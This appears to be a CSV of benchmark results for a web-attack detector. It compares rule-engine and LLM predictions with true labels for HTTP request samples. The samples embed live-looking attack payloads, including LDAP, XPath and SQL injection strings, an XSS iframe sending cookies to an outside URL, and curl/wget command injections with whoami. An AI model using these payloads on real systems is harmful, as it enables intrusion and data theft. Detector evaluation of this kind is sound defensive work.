dataset_index,sample_id,true_label,true_attack_type,predicted_label,predicted_attack_type,request_route,initial_status,final_status,source,attack_type,request_id,confidence,predicted_reasoning,latency_ms,submit_latency_ms,poll_count,completed,normalized_payloads,retrieval_trace_origin,retrieved_topk_count,retrieved_topk_categories,retrieved_topk_scores,retrieved_topk_payloads,retrieved_topk_source_files,retrieved_topk_line_nos,true_attack_type_in_topk,predicted_attack_type_in_topk,label_correct,attack_type_correct,error
787,xml_test-39045,malicious,LDAP Injection,malicious,LDAP Injection,queued,202,200,llm_batch,LDAP Injection,ed40efa6562861c84abf7d076a002482c15daccdb84641bea06d615dc7a3475b,0.95,The payload contains LDAP injection patterns like '(| (displayName=had*) (name = had* )( mail=had*))' used for enumeration or bypass.,512574.82866100327,3709.219012001995,255,True,"[""/darc/JONTuoKRq.f/ecFhoEtmevaOeNEYt/NZCGaj@ECtH/e5VXyaT7Eaw/tges5ireee/Ire/ecrB7RwceXb5G/tedoyoe3ltkeAme36Z.nsf"",""oazeNEe,dt"",""compress"",""dGxsYjU1N2ltNDRTdHNnYQ=="",""application/x-www-form-urlencoded"",""Fri, 11 Feb 05 10:07:35 CET"",""text/plain;q=0.5"",""x-mac-chinesesimp;q=0.7, x-mac-cyrillic, gb2312, macintosh;q=0.4"",""st-sIadae;q=0.0, owfsM-spd;q=0.2, hsftaog-hAnBgt"",""max-age=5"",""wiieEeazente=dzx8E8G6i;hirhseaaipttAo=nedgnrrmodxhtebe;9497rNc6sae=n-5MFdM;opst2l=>cglo;LWDdBsvrYfu=nuQ52cL"",""Sun, 28 Dec 08 15:34:05 GMT"",""ohnrIS=4hanah"",""Sun, 10 Aug 08 15:04:55 CET"",""*"",""*"",""\""-Gt5NG.BxIijq6uns0HS\"""",""19"",""no-cache"",""/festteLU/piEnn/ot03cc/q2iikewl/zuP6.png"",""deflate;q=0.9,gzip;q=0.4,trailers"",""Referer"","")   (|  (displayName=had*)  (name  =  had*  )(   mail=had*)"",""0.5 225.106.206.14, l6oEi/6.8 www.sHeRwgnu.tiff, mukse/6.9 174.32.90.51:81"",""compress"",""Are/6.6, yyhe4a/3.0, 7eytto/3.0, joo2/5.9"",""~~~~~~~~~~~~~~~~~~~~~~~"",""redocumentllneeeFi7Sgh3fta|"",""81r3wHRc"",""ge=u"",""opttiframeii"",""telnetaest"",""89015"",""nnI4yMm"",""passwdo"",""lDl3Aorcpre7vr"",""6714218693"",""4641""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
121,xml_test-42051,malicious,SQLi,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3729.0516600041883,3729.024212996592,0,True,"[""/nwP.zT_vG603NW9ipTcF/a6/xeoaGtBespofee6sy/sTD@rgeocBExRO7@@x/rwoTI0k6G.jI5ETn1/fhyrwh/iYK-eFz17s-0a/sPZ8B5K5R-kBib5O/crtlptioayrE/v@YxUUSsIYGw4rsock_stream.gif"",""lixl?qa0s4|smailSna$fha"",""746"",""58312423"",""330"",""hiquy:=)g6kc7m"",""isnte$nrw)d7te"",""6"",""'select customer_phone '||'from customers  '||'where  customer_surname='''||    lv_surname||''' and  customer_type=1';"",""89"",""A"",""19"",""video/mpeg"",""*;q=0.6"",""et37i-woa, o-usrs1sr;q=0.4"",""max-stale"",""172.68.108.190"",""rgsehrtnl3EaR=375728;yhea=j vls2apshsnullNformc;tnUeN3ednErtN=be.;epiof=8Ae"",""$Version=\""46\"""",""Tue, 24 Aug 04 14:03:53 GMT"",""\""zWjqHOL2ecS3XXB\"""",""100-continue"",""lhrrhh9j@48Flats.biz"",""Fri, 26 Oct 07 08:20:18 UTC"",""Sun, 24 Jan 10 12:27:10 CET"",""*"",""\""SDSPQP06P2nd1XtnJY\"""",""\""e2Ju.ac4fHkdh3jyVE.\"""",""83"",""8.6"",""hohu=eOrbE"",""Digest nonce"",""5hra 0ytzc=3ariec"",""-256"",""http://www.y1rmzE.uk/atdr.bin"",""gzip;q=0.4"",""Host"",""Mozilla/8.2 (Machintosh; U; PPC Mac OS X 6.5; nd-hn; rv:7.2.3) Gecko/24179394"",""MIPS"",""7502,392,16"",""Solaris"",""color8"",""307x472"",""7ee/6.1 196.216.120.158, FTP/0.0 www.1tmhapa.html, 6.7 163.28.121.133:7083"",""hh8e"",""Ens/2.7, ieoa/3.9, 4tt/2.8, ind/4.0, sute/1.0"",""264 99.10.30.250 \""a0gtsj1ecytcw5Eqrc\"""",""206.224.167.230"",""001394948859071824"",""------------------"",""~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
537,xml_test-46928,malicious,XSS,malicious,XSS,queued,202,200,llm_batch,XSS,bd673ad4c89c364d28e2d2e7f2392ddc706b750a505a5c488838a6ab934e9bf3,0.98,"The payload contains an XSS vector: '<iframe src= ""vbscript:[document.location.replace ('http://www.st.com/cgi-bin/nein.cgi' document.cookie);] "" >' attempting to execute vbscript.",512557.4221709976,3731.102000994724,255,True,"[""/Ae1Qdocuments/misa/hWywoYOSrqX0Zob/iget2muhenaita4hZotc/qEZXFtgyeDQNiybe/3bnjeBvV_XUnn-0cl/HlHH5nxDINYH/dlink9zci1J-phpSsBJ/iyZJf_a6Cvhcakz5dmv/f0.cfm"",""aev4io,4rgb4p"",""identity"",""http://www.lF2l.cz/ebdegni/2eknhr.txt"",""ck1lZTdwT2xlbWFhbnFoSw=="",""application/x-www-form-urlencoded"",""Mon, 28 Jun 04 09:50:06 GMT"",""Wed, 29 Nov 06 08:09:43 GMT"",""audio/basic;q=0.6, image/jpeg;q=0.4, image/gif"",""x-mac-korean;q=0.0, iso-8859-4;q=0.3, x-mac-arabic, iso-8859-5, windows-1254;q=0.1"",""*;q=0.8"",""e='n'"",""233.117.50.11"",""ixsoi=ite;toheaueei=4ER;taUIqseare3NV=w4D3C2Pl4X;KN5-1xp_q6Q5r=B5iqa"",""$Version=\""688\"""",""Tue, 13 Jul 04 15:31:49 CET"",""W/\""ZePz2OHFeYlBvufA5PPg\"""",""100-continue"",""iadhhX@vmafir.de"",""Wed, 03 Mar 04 23:49:43 UTC"",""Sun, 04 Jul 04 13:46:43 CET"",""\""9NvXorM87VYW9eRQD\"""",""*"",""Sun, 29 Jun 08 16:27:56 CET"",""86"",""9.1"",""no-cache"",""Digest response=\""eFbfA56cDAdebE9DbbcbBaEe47d454df\"""",""Basic ZG1lY21jOm5pbHE="",""531-1875,-8"",""/mtgaWoDk/efat/tnwl/emcazio/enoOes.txt"",""deflate,chunked"",""Accept-Encoding"",""osxhoaatd/5.1"",""MIPS"",""4346,951,8"",""Windows NT"",""color32"",""642x9764"",""3.6 www.Ehaersum.gif, 1.9 www.tltenyls.shtml"",""gzip"",""sdW/7.9, agrd/5.9, wt6wa9/7.2"",""179 www.uasae.gif \""peEehwtea6n8inr\"""",""207.203.23.208"",""3374825125599046"",""---------------------"",""~~~~~~~~~~~~~~~~~~~~~"",""s%"",""lkWDgZoiz2S"",""oandfromp"",""uiagitWt3qt"",""cfrcp0ae"",""6Eua2b6e"",""<iframe  src=   \""vbscript:[document.location.replace    ('http://www.st.com/cgi-bin/nein.cgi' document.cookie);]   \""    >"",""2sbcenzesutMtoofi6"",""craXAOG"",""$h"",""s3$etttto$"",""46376147""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
26,xml_test-39843,malicious,SSI,benign,,queued,202,200,llm_batch,,cd77547a186ee96678209e3e526617bad11c46a3f9096d8944ceffdefe83caea,0.7,"The payload contains 'unionpXRcatREV' which is not a clear SQL UNION keyword, and no other obvious malicious patterns.",512581.0785099893,3733.61259799276,255,True,"[""/eIplnurdsMo6ad/eI3Usl34A3tiMCCL/aifbh4tthy/6ttlcby3eocqdnww/Yjnrr/unionpXRcatREV/jN6VO/s6v/hM3TrZsFK8oxMH/sotU/otlpeehah8/nkeeEthleegnn.swf"",""gzip"",""application/x-www-form-urlencoded"",""*/*;q=0.3"",""iso-10646-ucs-2, x-mac-greek, iso-8859-5"",""*"",""Tue, 01 Apr 08 09:03:55 CET"",""\""dUDViYkUsEROtwTmV1\"""",""*"",""429"",""/ohvo46/s7b5rds/ocot9/yiat/uttG.tar"",""trailers"",""Mozilla/6.9 (Windows; U; Win 9x 8.2; nl-io; rv:0.4.7) Gecko/57952192"",""PowerPC"",""mit1staiNq7Wuu"",""beavOb"",""skechTotas"",""a3owgetiau8hnw"",""tea"",""eaen] \\fos\\ieeurrO"",""t0d"",""wesLDa6nt"","":drtiggfrea6posnuC"",""68636417"",""04siIaail7""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
467,patt-xss-1312,malicious,XSS,malicious,XSS,queued,202,200,llm_batch,XSS,dea34c41fef1e1b26800820c12b67293540529666df01ef7e241177558bb1a17,0.95,"The payload contains '""alert(1)""&gt;', a common XSS injection pattern.",512583.7644090061,3744.076760005555,255,True,"[""/search"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""\""alert(1)\"">"",""2312""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
303,patt-command-injection-0811,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,b1eeff071d01b30c45c7d3f789085b0f1fc0f9d1ee46287afa3eea069269513f,0.9,"The payload contains '$(`type', which indicates a command substitution attempt, typical in Remote Code Execution.",512619.9749919906,3763.3031829900574,255,True,"[""/view"",""$(`type"",""curl/8.0.1"",""*/*""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
276,patt-command-injection-0957,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,516d3c55a0ba3918dff0c4c184f14e48ad0c3aec2dd97e83bf66284dd7deec31,0.98,"The payload contains 'curl' and '`whoami`', which are clear indicators of a Remote Code Execution attempt.",512619.80422900524,3784.4360720046097,255,True,"[""/api/items"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""\\n\\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\\`whoami\\"",""1957""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
749,patt-command-injection-0958,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,66a87d3d7e7f15bf853f1ad11b9ba6210aaa842be9a14219c5c1960df855b7c2,0.98,"The payload contains 'wget' and '`whoami`', which are clear indicators of a Remote Code Execution attempt.",512579.92598300916,3783.1842309969943,255,True,"[""/search"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""\\n\\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\\`whoami\\"",""1958""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
38,patt-xpath-injection-0437,malicious,XPath Injection,malicious,Xpathi,queued,202,200,llm_batch,XPathi,13ea1fa2002a14697ab9cbd5433791771fced64e24151af9ddab6583c8dda0dd,1.0,"The input contains a clear blind XPath injection pattern 'substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)', used for data exfiltration.",907166.0258679913,3786.0019209911115,452,True,"[""/login"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"",""1437""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
642,xml_test-50033,malicious,XPath Injection,malicious,XPath Injection,queued,202,200,llm_batch,XPath Injection,14a6a2626e0d7c09cc4d8c27bdffe5f9f5d2f7452a9f22fb20ff356e3159a83c,0.9,"The payload contains 'or 1&lt; necbr/e/2etzh/child::text()[position()=1]', indicating an XPath injection attempt.",512660.3617530054,3791.841310012387,255,True,"[""/hr7t1oRkhiMdtpe/8uolw2ea/gpynAaTieSvtued/u3.xsowE_w5pr/o5Ldes4iXn9ueod/cddlzu6REgesUou/gd-Z2ublUM/miQOMviWr.css"",""srociirm"",""identity"",""/yitlb/smvar/fdpcaei/r4esbVdo.shtml"",""bGVxdGNhZXRudGdkcHRmcw=="",""application/x-www-form-urlencoded"",""Sat, 15 Oct 05 07:55:27 GMT"",""Sun, 09 Nov 08 23:13:56 UTC"",""audio/basic, video/quicktime;q=0.2"",""utf-8"",""eethsed'     or     1< necbr/e/2etzh/child::text()[position()=1] or  'adhce6uc'    =  '"",""max-stale=80466"",""80.186.16.60"",""hgauhu9atetr=rSHaY5;illOhnttbood4L=zts;rjlinn4dstlNseh=zm;e2=s5LfvY--F04;twiezsk=iroenTnTitosi;y0aY5=60403840"",""$Version=\""17\"""",""Thu, 08 Mar 07 23:33:44 CET"",""100-continue"",""vhmmsH@tdoi.it"",""Sat, 26 Jul 08 14:15:20 GMT"",""Wed, 27 Dec 06 11:21:59 UTC"",""\""7L6-.c9FKMWCxaffOeP\"""",""*"",""\""mA@xggY9HjojAEmC_Oy\"""",""3"",""6.7"",""no-cache"",""NTLM cXplaGZtZGRvcHByOHRScXNuc2lhZ2VhMHQ4Q3pzaDVuN0VhcnJ5bWlu"",""765-"",""/2aado/faeeeEej/ayO6ioes/g7otw.gif"",""trailers"",""Mozilla/3.1 (Machintosh; U; Mac OS X 0.4; rh-nQ; rv:5.4.7) Gecko/26402199"",""793x7153"",""3.5 116.246.96.157"",""et9sce/9.2, quccwr/8.8, 3xceD6/4.5"",""601 www.Dn0amett.shtml \""dantsuss5ePa\"""",""------------------------------"",""~~~~~~~~~~~~~~~~~~~~~"",""attidPhtDjRcbtreh8""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
193,xml_test-48591,malicious,XPath Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3813.7757730000885,3813.748115004273,0,True,"[""/nYU2VZfS0NnE/XGJjsfgf_j-QCW/n3.yQ6B8/teT94k08Ha@exec/thpestidoNaoFheemw2i/ibh4zabsLsT3SKu_NP9/3fxNuMpQTadminS6/cPyGb/ervZ6kK/o0yvgGfPJ./i7tLani/tvIWL9VCXxyRu-9.j.cfm"",""o,A0T"",""compress"",""/groqi/paIcoi20/r4co3Na8/o7sss.ace"",""U25mbzdsTGV0QXByZW50ZQ=="",""application/x-www-form-urlencoded"",""Tue, 16 Sep 08 18:22:20 GMT"",""Sat, 03 May 08 21:08:06 CET"",""audio/x-wav;q=0.5, application/postscript;q=0.1, text/plain"",""*;q=0.5"",""hite2i-Tlraf;q=0.1"",""no-store"",""58.151.109.14"",""yeuoWa=etdd;connectRM_Ix6kUTevalf=36940550;nibseaedN=ojrzi;waTpwecluiotepa=kmIinjrye0eiiv;anehiof=ltpasswdudeleteodubg qsand"",""$Version=\""380\"""",""Fri, 23 Feb 07 12:24:19 CET"",""W/\""g6dEmBv81@mImtM6koU@\"""",""100-continue"",""ebiq@eeIse.it"",""Fri, 12 Aug 05 14:17:39 UTC"",""Fri, 25 Nov 05 10:52:26 UTC"",""*"",""\""r-cV4nOGbLmGn0hdDQ\"""",""Mon, 12 Jun 06 14:46:28 UTC"",""1"",""0.0"",""x3Sy=lIy2k"",""Digest response=\""7fFB26efC9Fd9d2Aac334296DcDC1b71\"""",""Basic N2V6cjphZXVxaWk3"",""39-76,5-4266"",""http://www.arprro.org/2nrDzfw/9pib/eeEMs/ens8.dll"",""deflate;q=0.1,trailers"",""Authorization"",""Mozilla/3.8 (compatible; lrbeoeTdi; Linux i586; Mb0eitiar)"",""68000"",""2986,5659,32"",""FreeBSD"",""color8"",""853x5228"",""2.9 24.91.144.194, 5.5 www.mh0yoet.js:4646, 7.3 181.187.115.123"",""Oocesg; yihiw=2shm8kth"",""i8OE/3.6, 6xpo/8.4, iodng/7.5, t5Oo/9.1"",""003 60.71.243.7 \""olt7lttIl5tS\"" \""Mon, 09 Jun 08 19:36:33 GMT\"""",""90.231.108.36"",""41138293275827237103"",""-----------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""nizaeSad"",""qcodb/8a/dasis/child::node()[   position()=0]   |  t6to/easa/ele/child::text()[position()=69]  or    'ushbp3l'    ='""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
216,xml_test-50088,malicious,XPath Injection,malicious,XPath Injection,queued,202,200,llm_batch,XPath Injection,a08e1612680b9bcb4e3ca5da9f42c37c9cba540e6ba09c8808369cc0a67166fb,0.9,"The payload contains 'or 1&lt; 3/i73Rau/a7/child::text()[position()=449]', indicating an XPath injection attempt.",512662.91111300234,3803.78890800057,255,True,"[""/thvirno4geiaCtt/lLlB.mdb"",""mno,L"",""gzip"",""http://kimori.uk/qioini/EntAxt/oytdc/clheSsyu.wmn"",""NWZyR3BzZHlzeUV0U2UyaA=="",""application/x-www-form-urlencoded"",""Tue, 24 Nov 09 10:16:52 GMT"",""Wed, 07 Jan 09 21:54:35 CET"",""image/*;q=0.7, text/*, text/*;q=0.5"",""*"",""*;q=0.8"",""no-store"",""126.15.156.81"",""ohRlLNioCaa9=998;oedfOsn=ctboot.inisrhc@urpu'ar;gmttitcEebgeo=t ;soolshrluds8ia=eegis;A1ontn3=wi'  or     1<  3/i73Rau/a7/child::text()[position()=449]   or  'fmohn'= ';3DensctoapW=optthe"",""$Version=\""50\"""",""Sun, 05 Oct 08 04:56:36 UTC"",""\""h2ntYS_PIagTaRIj\"""",""uSist"",""Sat, 30 Aug 08 07:10:15 GMT"",""Mon, 04 Jun 07 07:32:13 CET"",""*"",""*"",""Wed, 11 Aug 04 18:36:55 CET"",""1922"",""5.6"",""on='tc6dEoe'"",""Digest algorithm=mrmdaea"",""NTLM aHJoYXlFZGMyZWVlZ2ltb3cwZ2VUc3Jjc2N5M2l0b2VjRWVlc3QyZQ=="",""-6254,-3"",""http://www.a1agt.ch/etntq/2thuq0r.js"",""trailers,chunked,trailers"",""Via"",""ngsei9e"",""68000"",""534,2890,16"",""Win98"",""color32"",""4253x311"",""HTTP/3.0 www.y0is7nir.css:7475, HTTP/5.7 105.120.30.240, FTP/3.6 208.14.199.106"",""compress"",""rinmv/0.0"",""653 103.93.101.105:17 \""aetlgatnhrco\"""",""0477829072611518"",""--------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""296248"",""hd1"",""1506985""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
226,patt-ldap-injection-0199,malicious,LDAP Injection,malicious,LDAP Injection,queued,202,200,llm_batch,LDAP Injection,7c957d2de8fe0805d2be21f071aca22fe5be928fa9d6d7d8a4c811bbd4d16dae,0.95,The payload contains LDAP injection patterns like '(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))' for authentication bypass.,512634.97592599015,3812.4396319908556,255,True,"[""/comments"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""query = ("",""*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"",""1199""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
268,xml_test-48381,malicious,XPath Injection,malicious,XPath Injection,queued,202,200,llm_batch,XPath Injection,29d689b911a11e179424c6281da90405f81d0b9f246101cfc340565f75b464fe,0.9,"The payload contains 'or path/child::node()[position()=N]', which is a clear XPath injection pattern.",512654.9112430075,3824.728685998707,255,True,"[""/Cmyrip/lqI3v0uocVzU-RW/pAq9zfDfmfG8Xd/o0LQdmVaVKXHH.l/fh/smiIndRliS7np/3UZqhx.bin"",""7"",""eaeIt9"",""laha"",""917644"",""niLe"",""application/zip, application/rtf;q=0.6, audio/basic;q=0.8"",""*"",""leSnt-cszzmR"",""$Version=\""15\"""",""Thu, 28 Oct 04 05:22:22 GMT"",""*"",""Sun, 29 Jul 07 04:58:07 CET"",""7"",""4.2"",""agrCfTy=jao"",""Digest username=\""annrnhk\"""",""/eaoiytTi/zg2uech.gif"",""3nbotf'    or  path/child::node()[position()=N]     or  'ebepwaw'    = '"",""color16""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
705,xml_test-41968,malicious,SQLi,malicious,SQLi,immediate,200,200,rule_engine,SQLi,,1.0,,3849.0298010001425,3848.999490001006,0,True,"[""/riiEm@R4oN/Z4selectI-Wi/19processing-instructionFS/gasLfr/t@cKqC7WIv54ZUWOmR.jpg"",""or     0<>(select    count(*)   from   wniIf)"",""365"",""49408"",""285"",""([9o"",""a;yut/lbetweents6e"",""image/png;q=0.7, audio/x-wav, text/html"",""*"",""Jti-net;q=0.9, pd-Nmptoia, r1n9en8a-a;q=0.0"",""only-if-cached"",""102.180.54.45"",""e8=1265060264;eeuwoa=edDNL"",""$Version=\""717\"""",""Thu, 25 Jun 09 13:52:10 CET"",""\""sVe4cTNh_tT9Of5\"""",""100-continue"",""4zD9@jt6etwau5.be"",""Mon, 15 Jan 07 20:24:15 UTC"",""Mon, 03 May 10 20:05:42 GMT"",""*"",""\""O1w-Jsqx72emG7d4wbl\"""",""Sat, 25 Sep 04 13:40:58 GMT"",""75"",""0.8"",""no-cache"",""Digest nonce"",""Basic V2VibzppeXRRYmJo"",""991-40833,238399-36"",""http://www.Daxstd.net/Tidsah/erirsIf6/oRwd.cfm"",""deflate,gzip;q=0.9,trailers"",""Proxy-Authorization"",""Mozilla/5.7 (Windows; U; Win98 6.8; mn-un; rv:4.1.7) Gecko/91720625"",""MIPS"",""4298,556,32"",""Windows 98"",""color32"",""329x4778"",""seQnm/8.6 81.43.123.224, HTTP/9.0 www.n2esy.tiff:2710"",""identity"",""osgosN/1.6, nzpps/5.5, rhoft/4.2, feo/7.7, htler/3.3"",""494 42.216.10.168:95428 \""esi7pe3nyrrtei\"" \""Wed, 28 Apr 10 16:07:09 UTC\"""",""88.3.128.18"",""41242078999326437"",""---------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
454,patt-ldap-injection-0134,malicious,LDAP Injection,malicious,LDAP Injection,queued,202,200,llm_batch,LDAP Injection,73605f901e488e00d8679f95fe341df54affe28b6a29b45d03c3426245dbed0e,0.9,"The payload contains a partial LDAP injection pattern '*)(ATTRIBUTE_HERE=*', indicating an attempt to test for LDAP injection.",512700.41243798914,3852.3362439882476,255,True,"[""/profile"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""Can be used in an injection like `*)(ATTRIBUTE_HERE=*"",""1134""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
247,xml_test-35901,malicious,XPath Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3864.0767610049807,3864.0449829981662,0,True,"[""/WOA2B2zly.Areplace4/r1sftc/n9vZO/8hlzua/Uet02/hre9bcYfenub8lUgOg/aP4pGAh2r/iqai/mXyjZCNgiKNFXQR1EU/70ugKbgsoundZ6l/q_d0ghJpdivL34K/zmm3lrrTji7mAIf.htm"",""c,sswde,eaav"",""identity"",""TG5ObTFzclRvb2V0b2F1cg=="",""application/x-www-form-urlencoded"",""Fri, 19 Aug 05 15:56:36 GMT"",""Tue, 12 Aug 08 06:52:31 CET"",""image/*"",""*;q=0.0"",""*"",""no-transform"",""Wed, 17 Aug 05 09:53:52 UTC"",""W/\""iImJMbHSDZxy8ftSG4q\"""",""100-continue"",""Thu, 21 Jan 10 14:02:46 CET"",""\""f5Ppcu05_j9XhoASb6k\"""",""\""wyJwU9AOTabNGIc\"""",""Thu, 19 Feb 09 06:25:07 CET"",""5967"",""no-cache"",""NTLM dGlXcVRjc29vdXVrcDl1dGh4dG5rZWhlYW5seXVHUW9ldHlIeWgwbEE="",""http://www.oouhh.st/llFeItse/oraaoTo/Lerseeeh/anHtttl/Tzisna5.mdb"",""Upgrade"",""22  or  count(path/child::node()[position()=((i+j+k+l+1)]   | path/child::*()[position()=(k+1)])=1 or    132="",""Win95"",""compress"",""006 193.174.255.193:622 \""3tta0\"" \""Sun, 25 Dec 05 02:22:56 UTC\"""",""104.3.78.75"",""15537"",""elrnidzbIi1d"",""suinr"",""9271560"",""i2i"",""0img-"",""sIuu9eXbeedmo"",""09519""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
138,xml_test-34490,benign,,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3869.326825995813,3869.3009839917067,0,True,"[""/hrFidpstlwrdLt.js"",""s,ynrnc,opb"",""deflate"",""/caj0/neintaa/diebr/Eoe5efi0/M0ui.sh"",""TlRFdXJidHNlemFxZnJhcw=="",""application/x-www-form-urlencoded"",""Tue, 21 Feb 06 24:19:15 UTC"",""Sun, 03 Jan 10 23:41:24 GMT"",""*/*;q=0.8"",""iso-8859-5, gb2312;q=0.0, iso-8859-2, windows-1258;q=0.9, iso-8859-15;q=0.6"",""eewo-dxig;q=0.1, helt-mqpus, rEqoon-eZiqnlat;q=0.3, cc-dhty4;q=0.5, lerhii-se;q=0.5"",""min-fresh=46321"",""96.49.197.35"",""tdtoeuowNgde3=425659;teEe19tnamE=848921383;tJu4a=qekds96smeee6;eiatlsjj=fea"",""$Version=\""5\"""",""Thu, 15 Nov 07 08:16:35 CET"",""W/\""fQVQq1XnS.oBY1W\"""",""ei9Ox7pc"",""doesa@0psfre.gov"",""Wed, 04 May 05 09:19:09 GMT"",""Thu, 19 Aug 04 08:07:46 CET"",""*"",""*"",""Fri, 06 Jun 08 12:52:09 GMT"",""7"",""1.0"",""sKcoo3='oc'"",""8bnrqi t6sehpaY=rejt"",""Digest cnonce=\""slDrraAo\"""",""003-49,-300,-23"",""/iaaet4/eAcetqJn/ertn1/cw9i.jsp"",""trailers,gzip;q=0.8"",""Upgrade"",""hyaNar5is"",""StrongARM"",""3627,6324,8"",""Windows 95"",""color32"",""7528x1732"",""e7wu7t/2.2 www.maRhaa6.tiff, FTP/0.0 www.rsyht.tiff:38609, 7.0 www.r7rrh.html:795"",""gzip"",""lnanIi/4.1, w0wfaa/7.7"",""855 158.106.17.233:019 \""warne\"" \""Sun, 23 Sep 07 02:08:13 GMT\"""",""63.206.208.126"",""16107825761"",""------------------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""SLA riEt\\"",""87"",""eire9"",""obriett42"",""55514"",""oisg2mIiac4accept9 e)sfv"",""inpMzi"",""44641"",""8"",""weje%s8pyaliiframehrii"",""opt|ttserviceson7abm eh"",""lrIhYezBnnaeqesJ""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
